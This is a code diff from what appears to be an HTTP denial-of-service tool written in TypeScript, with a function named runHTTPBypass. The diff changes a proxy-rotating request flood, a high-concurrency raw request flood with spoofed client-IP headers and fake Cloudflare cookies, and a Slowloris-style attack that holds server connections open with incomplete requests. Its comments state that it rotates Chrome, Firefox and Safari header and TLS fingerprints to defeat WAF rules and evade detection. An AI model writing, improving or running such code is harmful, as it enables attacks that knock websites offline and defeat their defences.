@@ -1395,17 +1395,19 @@ async function runHTTPBypass(
   const flushIv = setInterval(flush, 300);
   let proxyIdx  = 0;
 
-  // ── Layer A: Chrome-fingerprinted fetch with proxy rotation ─────────────
+  // ── Layer A: Multi-browser fetch with proxy rotation ─────────────────────
+  // Rotates Chrome/Firefox/Safari on every request — JA3+header fingerprint diversity
   const runLayerA = async (): Promise<void> => {
-    const profile   = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar = new Map<string, string>();
     while (!signal.aborted) {
+      const bt       = randomBrowserType();                   // rotate per-request
+      const profile  = pickProfile(bt);
       const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
       const bust     = Math.random() < 0.5 ? `?v=${randInt(1,999999)}&_=${randStr(8)}` : "";
       const fullPath = pagePath + bust;
       const fullUrl  = `${u.protocol}//${hostname}${fullPath}`;
 
-      const hdrs = buildWAFHeaders(hostname, fullPath, cookieJar, profile);
+      const hdrs = buildWAFHeaders(hostname, fullPath, cookieJar, profile, bt);
       const fetchHdrs: Record<string, string> = {};
       for (const [k, v] of Object.entries(hdrs)) {
         if (!k.startsWith(":")) fetchHdrs[k] = v;
@@ -1433,33 +1435,48 @@ async function runHTTPBypass(
     }
   };
 
-  // ── Layer B: High-concurrency raw http.request with Chrome headers ───────
-  // Uses http.Agent (no per-host cap) for max parallel connections
+  // ── Layer B: High-concurrency raw http.request with multi-browser headers ─
+  // Rotates Chrome/Firefox/Safari headers — defeats header-fingerprint WAF rules
   const runLayerB = (): Promise<void> => new Promise(resolve => {
     let inflight = 0;
     const doReq = () => {
       if (signal.aborted) { if (inflight === 0) resolve(); return; }
       inflight++;
-      const profile  = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+      const lbBt     = randomBrowserType();
+      const lbProf   = pickProfile(lbBt);
       const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?_=${randStr(8)}&v=${randInt(1,9999999)}`;
+      // Build browser-accurate headers per type (no sec-ch-ua for Firefox/Safari)
+      const isChrome = lbBt === "chrome";
+      const isSafari = lbBt === "safari";
+      const lbUa     = lbProf.ua;
       const hdrs: Record<string, string> = {
-        "user-agent":                 profile.ua,
-        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "accept-language":            "en-US,en;q=0.9",
-        "accept-encoding":            "gzip, deflate, br, zstd",
-        "sec-ch-ua":                  profile.brand,
-        "sec-ch-ua-mobile":           profile.mobile ? "?1" : "?0",
-        "sec-ch-ua-platform":         profile.plat,
-        "sec-fetch-dest":             "document",
-        "sec-fetch-mode":             "navigate",
-        "sec-fetch-site":             "none",
-        "cache-control":              "max-age=0",
-        "priority":                   "u=0, i",
-        "x-forwarded-for":            randIp(),
-        "cf-connecting-ip":           randIp(),
-        "cookie":                     `__cf_bm=${randHex(43)}; _ga=GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`,
-        "Host":                       hostname,
-        "Connection":                 "close",
+        "user-agent":      lbUa,
+        "accept":          isSafari
+          ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+          : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "accept-language": lbBt === "firefox" ? "en-US,en;q=0.5" : "en-US,en;q=0.9",
+        "accept-encoding": isSafari ? "gzip, deflate, br" : "gzip, deflate, br, zstd",
+        ...(isChrome ? {
+          "sec-ch-ua":         (lbProf as typeof CHROME_PROFILES[0]).brand,
+          "sec-ch-ua-mobile":  (lbProf as typeof CHROME_PROFILES[0]).mobile ? "?1" : "?0",
+          "sec-ch-ua-platform":(lbProf as typeof CHROME_PROFILES[0]).plat,
+          "sec-fetch-dest":    "document",
+          "sec-fetch-mode":    "navigate",
+          "sec-fetch-site":    "none",
+          "cache-control":     "max-age=0",
+          "priority":          "u=0, i",
+        } : lbBt === "firefox" ? {
+          "sec-fetch-dest":    "document",
+          "sec-fetch-mode":    "navigate",
+          "sec-fetch-site":    "none",
+          "sec-fetch-user":    "?1",
+          "te":                "trailers",
+        } : {}),
+        "x-forwarded-for":  randIp(),
+        "cf-connecting-ip": randIp(),
+        "cookie":           `__cf_bm=${randHex(43)}; _ga=GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`,
+        "Host":             hostname,
+        "Connection":       "close",
       };
       const reqOpts: http.RequestOptions | https.RequestOptions = {
         hostname: resolvedIp, port: tgtPort, path: pagePath,
@@ -1483,12 +1500,17 @@ async function runHTTPBypass(
     for (let i = 0; i < SLOTS_B; i++) doReq();
   });
 
-  // ── Layer C: Slow drain — Chrome-fingerprinted incomplete requests ────────
+  // ── Layer C: Slow drain — multi-browser incomplete requests ──────────────
+  // Rotates Chrome/Firefox/Safari fingerprints to avoid fingerprint-based detection
   const runLayerC = async (): Promise<void> => {
     const oneSlot = (): Promise<void> => new Promise(resolve => {
       if (signal.aborted) { resolve(); return; }
+      const lcBt      = randomBrowserType();
+      const lcCiphers = lcBt === "firefox" ? firefoxTLSProfile().ciphers
+                      : lcBt === "safari"  ? safariTLSProfile().ciphers
+                      : randomJA3Ciphers();
       const sock: net.Socket = isHttps
-        ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, ciphers: randomJA3Ciphers() })
+        ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, ciphers: lcCiphers })
         : net.createConnection({ host: resolvedIp, port: tgtPort });
       sock.setTimeout(90_000);
       sock.setNoDelay(true);
@@ -1500,25 +1522,35 @@ async function runHTTPBypass(
         try { sock.destroy(); } catch { /**/ }
         resolve();
       };
-      const profile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+      const profile = pickProfile(lcBt);
       const onConn  = () => {
         localPkts++;
-        // Send partial Chrome-fingerprinted request — missing final CRLF
-        const partial = [
+        // Send partial browser-fingerprinted request — missing final CRLF
+        // Chrome includes sec-ch-ua; Firefox/Safari do not
+        const lcIsChrome = lcBt === "chrome";
+        const lcChrome   = lcIsChrome ? (profile as typeof CHROME_PROFILES[0]) : null;
+        const baseHeaders = [
           `GET ${WAF_PATHS[randInt(0, WAF_PATHS.length)]}?_=${randStr(8)} HTTP/1.1`,
           `Host: ${hostname}`,
           `User-Agent: ${profile.ua}`,
-          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`,
-          `Accept-Language: en-US,en;q=0.9`,
-          `Accept-Encoding: gzip, deflate, br, zstd`,
-          `Sec-CH-UA: ${profile.brand}`,
-          `Sec-CH-UA-Mobile: ${profile.mobile ? "?1" : "?0"}`,
-          `Sec-CH-UA-Platform: ${profile.plat}`,
-          `Cache-Control: max-age=0`,
+          `Accept: ${lcBt === "safari" ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}`,
+          `Accept-Language: ${lcBt === "firefox" ? "en-US,en;q=0.5" : "en-US,en;q=0.9"}`,
+          `Accept-Encoding: ${lcBt === "safari" ? "gzip, deflate, br" : "gzip, deflate, br, zstd"}`,
+          ...(lcIsChrome && lcChrome ? [
+            `Sec-CH-UA: ${lcChrome.brand}`,
+            `Sec-CH-UA-Mobile: ${lcChrome.mobile ? "?1" : "?0"}`,
+            `Sec-CH-UA-Platform: ${lcChrome.plat}`,
+            `Cache-Control: max-age=0`,
+          ] : lcBt === "firefox" ? [
+            `Sec-Fetch-Dest: document`,
+            `Sec-Fetch-Mode: navigate`,
+            `Sec-Fetch-Site: none`,
+          ] : []),
           `Cookie: __cf_bm=${randHex(43)}`,
           `Connection: keep-alive`,
           ``, // NO terminal CRLF — server waits for more headers forever
-        ].join("\r\n");
+        ];
+        const partial = baseHeaders.join("\r\n");
         sock.write(partial);
         localBytes += partial.length;
         // Trickle a fake header every 12-30s to prevent server timeout
@@ -2640,6 +2672,8 @@ function buildSafariHeaders(
 }
 
 // Main WAF header builder — routes to correct browser builder based on type
+// When bt is omitted, picks a random browser type (Chrome 65%, Safari 20%, Firefox 15%)
+// This ensures every call without explicit bt gets JA3/JA4 fingerprint diversity.
 function buildWAFHeaders(
   hostname:  string,
   path:      string,
@@ -2647,7 +2681,7 @@ function buildWAFHeaders(
   profile?:  AnyBrowserProfile,
   bt?: BrowserType,
 ): Record<string, string> {
-  const browserType = bt ?? "chrome";
+  const browserType = bt ?? randomBrowserType();
   if (browserType === "firefox") return buildFirefoxHeaders(hostname, path, cookieJar, profile);
   if (browserType === "safari")  return buildSafariHeaders(hostname, path, cookieJar, profile);
   return buildChromeHeaders(hostname, path, cookieJar, profile);
